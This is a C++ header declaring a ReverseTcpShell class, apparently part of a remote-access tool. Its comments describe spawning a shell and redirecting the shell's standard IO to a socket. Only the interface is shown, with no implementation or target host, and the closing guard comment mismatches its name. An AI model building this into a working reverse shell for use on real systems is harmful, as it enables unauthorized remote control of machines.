#ifndef REVERSE_TCP_SHELL_H
#define REVERSE_TCP_SHELL_H

#include <Common.h>

#include <vector>

namespace Task
{

/*
 *  @brief  The reverse tcp shell task class.
 *          Responsible for setting up the shell process and redirecting
 *          the standard IO file descriptors to the socket.
 */
class ReverseTcpShell
{
public:
    typedef asio::local::stream_protocol::socket UnixSocket;        ///< The asio unix socket wrapper typedef.

    static const std::string SHELL;
    static const std::string PATH;

    /*
     *  @brief  Constructor.
     *
     *  @param  ioContext the asio io execution context.
     */
    ReverseTcpShell(asio::io_context &ioContext);

    //! Destructor
    ~ReverseTcpShell();

    /*
     *  @brief  Start the reverse shell.
     *          Start the child process, redirect the standard IO
     *          file descriptors to the appropriate socket, set the
     *          appropriate shell variables and start the new shell.
     *
     *  @return whether the shell start completed successfully.
     */
    bool Start();

    /*
     *  @brief  Get the parent socket.
     *
     *  @return the parent socket object reference.
     */
    UnixSocket &GetParentSocket();

    /*
     *  @brief  Get the child shell process id.
     *
     *  @return the child shell process id.
     */
    pid_t GetShellPid() const;

    /*
     *  @brief  Check whether the shell child process has terminated.
     *
     *  @return whether the shell terminated (first) and status code (second).
     *          status code is only initialized when the child terminates.
     */
    std::pair<bool, int> HasShellTerminated() const;

private:
    UnixSocket  m_parentSocket; ///< The parent asio Unix socket wrapper.
    UnixSocket  m_childSocket;  ///< The child asio Unix socket wrapper.
    pid_t       m_shellPid;     ///< The process id of the child shell.
};

} // namespace Task

#endif // UI_MENU_H
